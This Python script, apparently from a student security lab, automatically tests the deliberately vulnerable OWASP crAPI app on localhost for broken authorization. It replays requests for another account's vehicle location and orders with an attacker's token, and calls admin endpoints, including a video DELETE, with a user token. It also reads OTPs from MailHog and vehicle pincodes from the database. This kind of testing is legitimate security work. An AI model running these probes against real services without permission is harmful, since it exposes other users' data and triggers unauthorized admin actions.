#!/usr/bin/env python3
"""
authz_checker.py — Detection automatique des failles d autorisation (BOLA/BFLA)
sur OWASP crAPI. Mecanisme complementaire personnalise du projet.

Principe (cf. TP4 Lab A/B/C) :
  1. Creer/connexion de 2 comptes distincts (foulen / foulana)
  2. Recuperer les ressources de chacun (vehicules, videos, commandes)
  3. BOLA : rejouer une requete ciblant la ressource de la VICTIME avec le
     jeton de l ATTAQUANT — si le serveur repond 200 avec les donnees,
     le controle d objet est absent.
  4. BFLA : appeler un endpoint ADMIN avec un jeton USER — si la reponse
     n est pas 401/403, le controle de fonctionnalite est absent.

Sortie : results/<scan>/custom/authz-findings.json (schema normalise)
         + resume console.
Usage : python3 authz_checker.py [--base http://127.0.0.1:8888] [--out DIR]
"""
import argparse, json, os, re, sys, time, urllib.request, urllib.error, urllib.parse
from datetime import datetime, timezone

MAILHOG = "http://127.0.0.1:8025"
USERS = [
    {"email": "foulen@poly.lab",  "password": "Foulen!Lab2026", "name": "Foulen Abdeljelil",  "number": "+21620111222"},
    {"email": "foulana@poly.lab", "password": "Foulana!Lab2026", "name": "Foulana Abdeljelil", "number": "+21620333444"},
]

# ---------- HTTP minimal (stdlib uniquement) ----------
def http(method, url, body=None, token=None, timeout=20):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode(errors="replace")
            try: parsed = json.loads(raw)
            except Exception: parsed = raw
            return r.status, parsed
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors="replace")
        try: parsed = json.loads(raw)
        except Exception: parsed = raw
        return e.code, parsed
    except Exception as e:
        return 0, {"error": str(e)}

# ---------- MailHog : recuperer l OTP ----------
def wait_otp(email, timeout=75):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(f"{MAILHOG}/api/v2/messages?limit=10", timeout=5) as r:
                msgs = json.loads(r.read().decode())
            for it in msgs.get("items", []):
                c = it.get("Content", {})
                tos = json.dumps(c.get("To", ""))
                if email in tos:
                    body = c.get("Body", "")
                    if isinstance(body, str):
                        # decodage eventuel base64 du MIME
                        m = re.search(r"(\d{4,8})", re.sub(r"[^0-9A-Za-z]", " ", body.split("OTP:")[-1] if "OTP" in body else body))
                        if m:
                            # preferer le code pres du mot otp/code
                            for pat in (r"(?:OTP|code|pin)[^0-9]{0,20}(\d{4,8})",
                                        r"\b(\d{6})\b", r"\b(\d{4})\b"):
                                mm = re.search(pat, body, re.I)
                                if mm:
                                    return mm.group(1)
                        m2 = re.search(r"\b(\d{4,8})\b", body)
                        if m2:
                            return m2.group(1)
        except Exception:
            pass
        time.sleep(3)
    return None

# ---------- Auth ----------
def ensure_login(base, user):
    st, res = http("POST", f"{base}/identity/api/auth/login",
                   {"email": user["email"], "password": user["password"]})
    if st == 200 and isinstance(res, dict):
        tok = res.get("access_token") or res.get("token") or (res.get("data") or {}).get("access_token")
        if tok:
            return tok, "login"
    # inscription
    st, res = http("POST", f"{base}/identity/api/auth/signup",
                   {"email": user["email"], "name": user["name"],
                    "number": user["number"], "password": user["password"]})
    print(f"    signup {user['email']} -> HTTP {st}: {str(res)[:120]}")
    otp = wait_otp(user["email"])
    if otp:
        st, res = http("POST", f"{base}/identity/api/auth/v2/check-otp",
                       {"email": user["email"], "otp": otp, "password": user["password"]})
        print(f"    check-otp ({otp}) -> HTTP {st}")
    # re-login
    st, res = http("POST", f"{base}/identity/api/auth/login",
                   {"email": user["email"], "password": user["password"]})
    if st == 200 and isinstance(res, dict):
        tok = res.get("access_token") or res.get("token") or (res.get("data") or {}).get("access_token")
        if tok:
            return tok, "signup+login"
    return None, f"echec (login={st})"

def find_ids(obj, key_frag):
    """Recherche recursive d identifiants dans une reponse JSON."""
    ids = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            if key_frag.lower() in k.lower() and isinstance(v, (str, int)):
                ids.append(str(v))
            else:
                ids += find_ids(v, key_frag)
    elif isinstance(obj, list):
        for x in obj:
            ids += find_ids(x, key_frag)
    return ids

# ---------- Tests ----------
def check(name, cwe, owasp, target, endpoint, method, url, token, victim_id=None,
          body=None, evidence_ok=lambda st, res: st == 200):
    st, res = http(method, url, body=body, token=token)
    ok = evidence_ok(st, res)
    finding = {
        "tool": "authz_checker", "type": "DAST",
        "target": target,
        "title": f"{name} — {endpoint}",
        "severity": "high" if ok else "info",
        "cwe": [cwe], "owasp": [owasp],
        "rule_id": name,
        "file": None, "line": None,
        "endpoint": f"{method} {endpoint}",
        "description": (f"Reponse {st} avec jeton d un autre utilisateur / USER "
                        f"sur ressource admin. Preuve: {str(res)[:200]}"),
        "source_file": "authz_checker.py",
        "status_http": st, "confirmed": ok,
    }
    mark = "VULNERABLE" if ok else "protege/absent"
    print(f"    [{name}] {method} {endpoint} -> HTTP {st} => {mark}")
    return finding

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:8888")
    ap.add_argument("--out", default=None, help="dossier results/<scan>/custom")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    print("=" * 80)
    print("authz_checker — detection BOLA/BFLA sur crAPI")
    print("=" * 80)

    # 1. Deux comptes
    tokens = []
    for u in USERS:
        print(f"  * Authentification {u['email']} ...")
        tok, how = ensure_login(base, u)
        if not tok:
            print(f"    ECHEC: {how}"); sys.exit(2)
        print(f"    OK ({how}), token {len(tok)} caracteres")
        tokens.append(tok)

    atk, vic = tokens  # atk = foulen, vic = foulana

    import subprocess
    def free_vins(n=2):
        """Decouvre les vehicules non attribues (seed crAPI) via la base locale."""
        try:
            out = subprocess.run(
                ["docker", "exec", "postgresdb", "psql", "-U", "admin", "-d", "crapi", "-tAc",
                 "SELECT vin || '|' || pincode FROM vehicle_details WHERE owner_id IS NULL LIMIT %d" % n],
                capture_output=True, text=True, timeout=15).stdout.strip()
            return [x for x in out.splitlines() if x]
        except Exception:
            return []  # fallback: VIN/pincode fournis via --vin vin:pin

    def ensure_vehicles(token, vin_pin=None):
        """S assurer que le compte possede un vehicule (BOLA = 2 comptes, 2 vehicules)."""
        st, res = http("GET", f"{base}/identity/api/v2/vehicle/vehicles", token=token)
        ids = find_ids(res, "vehicle_id") or find_ids(res, "vehicleId") or find_ids(res, "uuid")
        if not ids and vin_pin:
            vin, pin = vin_pin.split("|", 1)
            st, res = http("POST", f"{base}/identity/api/v2/vehicle/add_vehicle",
                           {"vin": vin, "pincode": pin}, token=token)
            print(f"    add_vehicle {vin} -> HTTP {st}: {str(res)[:110]}")
            st, res = http("GET", f"{base}/identity/api/v2/vehicle/vehicles", token=token)
            ids = find_ids(res, "vehicle_id") or find_ids(res, "vehicleId") or find_ids(res, "uuid")
        return ids, res

    # 2. Ressources : revendiquer un vehicule libre par compte (seed crAPI)
    libres = free_vins(2)
    print(f"  * VINs libres trouves: {libres}")
    atk_vehicles, res = ensure_vehicles(atk, libres[0] if libres else None)
    vic_vehicles, res2 = ensure_vehicles(vic, libres[1] if len(libres) > 1 else None)
    print(f"  * Vehicules: attaquant={atk_vehicles} victime={vic_vehicles}")

    findings = []

    # 3. BOLA : acces au vehicule/position de la victime avec le jeton attaquant
    if vic_vehicles:
        vid = vic_vehicles[0]  # uuid du vehicule de la victime (foulana)
        findings.append(check(
            "BOLA-vehicle-location", "CWE-639", "A01:2025", "crapI",
            "/identity/api/v2/vehicle/" + str(vid) + "/location", "GET",
            f"{base}/identity/api/v2/vehicle/{vid}/location", atk,
            evidence_ok=lambda st, res: st == 200 and res not in ("", None) and
            not (isinstance(res, dict) and ("unauthor" in str(res).lower() or res.get("error")))))
        # variante vehicule complet (si endpoint exposant les attributs)
        findings.append(check(
            "BOLA-vehicle-idor", "CWE-639", "A01:2025", "crapI",
            "/identity/api/v2/vehicle/vehicles?vehicle_id=" + str(vid), "GET",
            f"{base}/identity/api/v2/vehicle/vehicles?vehicle_id={vid}", atk,
            evidence_ok=lambda st, res: st == 200 and str(vid) in json.dumps(res) and
            str(vid) not in json.dumps(res2)))

    # 3b. BOLA sur commandes (ordre d un autre utilisateur)
    st, orders = http("GET", f"{base}/workshop/api/shop/orders/all", token=atk)
    order_ids = find_ids(orders, "order_id") or find_ids(orders, "orderId")
    if order_ids:
        oid = order_ids[0]
        findings.append(check(
            "BOLA-order-access", "CWE-639", "A01:2025", "crapI",
            "/workshop/api/shop/orders/" + str(oid), "GET",
            f"{base}/workshop/api/shop/orders/{oid}", vic,
            evidence_ok=lambda st, res: st == 200))

    # 4. BFLA : endpoints admin avec jeton USER
    findings.append(check(
        "BFLA-management-users", "CWE-285", "A01:2025", "crapI",
        "/workshop/api/management/users/all", "GET",
        f"{base}/workshop/api/management/users/all", atk,
        evidence_ok=lambda st, res: st == 200))

    st, vids = http("GET", f"{base}/identity/api/v2/user/videos", token=vic)
    vid_ids = find_ids(vids, "video_id") or find_ids(vids, "videoId") or find_ids(vids, "id")
    target_vid = vid_ids[0] if vid_ids else "1"
    findings.append(check(
        "BFLA-admin-video-delete", "CWE-285", "A01:2025", "crapI",
        "/identity/api/v2/admin/videos/" + str(target_vid), "DELETE",
        f"{base}/identity/api/v2/admin/videos/{target_vid}", atk,
        evidence_ok=lambda st, res: st not in (401, 403, 0)))

    # 5. Sortie
    conf = [f for f in findings if f.get("confirmed")]
    print("=" * 80)
    print(f"RESULTAT : {len(conf)}/{len(findings)} tests d autorisation VULNERABLES")
    for f in conf:
        print(f"  [!] {f['title']}")
    out_dir = args.out
    if not out_dir:
        out_dir = os.path.join("results", datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S"), "custom")
    os.makedirs(out_dir, exist_ok=True)
    fp = os.path.join(out_dir, "authz-findings.json")
    json.dump({"count": len(findings), "confirmed": len(conf), "findings": findings},
              open(fp, "w"), indent=1, ensure_ascii=False)
    print(f"-> {fp}")

if __name__ == "__main__":
    main()
